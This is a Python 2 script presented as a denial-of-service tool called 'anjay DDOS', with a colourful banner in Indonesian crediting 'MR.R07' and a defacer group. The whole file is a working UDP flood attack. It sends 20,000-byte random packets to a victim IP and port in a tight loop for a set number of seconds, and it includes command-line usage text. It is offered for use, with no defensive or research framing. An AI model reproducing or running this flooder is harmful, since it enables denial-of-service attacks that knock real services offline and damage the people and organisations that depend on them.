
import time
import socket
import random
import sys
def usage():
    print "\033[1;32m############################################################"
    print "#-----------------------[\033[1;91manjay DDOS\033[1;32m]-----------------------#"
    print "#----------------------------------------------------------#"
    print "#   \033[1;91mCommand: " "python2 anjay.py " "<ip> <port> <packet> \033[1;32m #"
    print "#                                                        ##"
    print "#\033[1;91mCreator:MR.R07  \033[1;32m##      #      #                     ##"
    print "#\033[1;91mTOOLS anjay DDOS        \033[1;32m##     #      #                     ##"
    print "#\033[1;91mVersion:1.0        \033[1;32m##      #      #                     ##"
    print "#\033[1;91mTQAdmin:ADA MASALAH AMA TOOLS INI CHAT 0895341322341  ##"
    print "#\033[1;91m       :TOOLS anjay DDOS ADALAH SEBUAH TOOLS BAHAYA!!! ##"
    print "#                     \033[1;91m ##     \033[1;32m#  \033[1;91m  \033[1;32   ##"
    print "#                     \033[1;91m##  \033[1;32m###   \033[1;91m  \033[1;32m   ##"
    print "#               \033[1;91m<--[DEFACER INDONESIA SALAM DARI MedanCyberTeam]-->         \033[1;32m  ##"
    print "############################################################"
    print "tools anjay DDOS BY MR.R07"
    print "KUNJUNGI WEBSITE GUA https://www.mytoolsonline"
    print "di buat oleh MR.R07"
def flood(victim, vport, duration):
    # Support us yaakk... :)
    # OK CARA PAKE ADA DI BAWAH INI!!! "SOCK_DGRAM" itu  menunjukkan  UDP type program
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 20000 representasi satu byte ke server
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMemulai \033[1;32m%s \033[1;91mMELUNCUR KAN NUKLIR :V \033[1;32m%s \033[1;91mpada port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))

if __name__ == '__main__':
    main()